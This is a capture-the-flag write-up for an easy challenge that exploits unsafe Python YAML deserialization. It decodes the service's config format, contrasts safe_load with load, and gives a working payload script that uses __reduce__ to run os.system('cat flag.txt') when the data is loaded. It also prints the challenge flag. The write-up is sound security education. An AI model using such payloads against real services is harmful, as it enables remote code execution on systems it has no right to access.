# Hijack (easy)
This challenge will use python YML deserialization.

When connecting to the remote we can generate a config load a config or exit

When we generate a config we get a base64 string
```
ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxMCcsIGF1dG9fY2FsaWJyYXRpb246ICdPTicsCiAgcHJvcHVsc2lvbl90ZW1wOiAnMTAnLCBzb2xhcl9hcnJheV90ZW1wOiAnMTAnLCB1bml0czogRn0K
```

When decoded:
```
!!python/object:__main__.Config {IR_spectrometer_temp: '10', auto_calibration: 'ON',
  propulsion_temp: '10', solar_array_temp: '10', units: F}
```

First I noted that this is a python service running on the remote.
After looking for a similar structured string online I found out that this is what YML serialization looked like

Next I had looked at how this can be exploited.
It seems that there are 2 types of load functions:
* `safe_load` - will not deserialize class objects
* `load` - will deserialize class objects

I tried my luck with hoping that it will use unsafe deseralization, and it was

```python
# https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization
# HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
import yaml
import base64
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess
import os

class Payload(object):
    def __reduce__(self):
        return (os.system,('cat flag.txt',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(base64.b64encode(deserialized_data))
```

Before the final version I have submitted some other commands to find out where the flag is on the system.
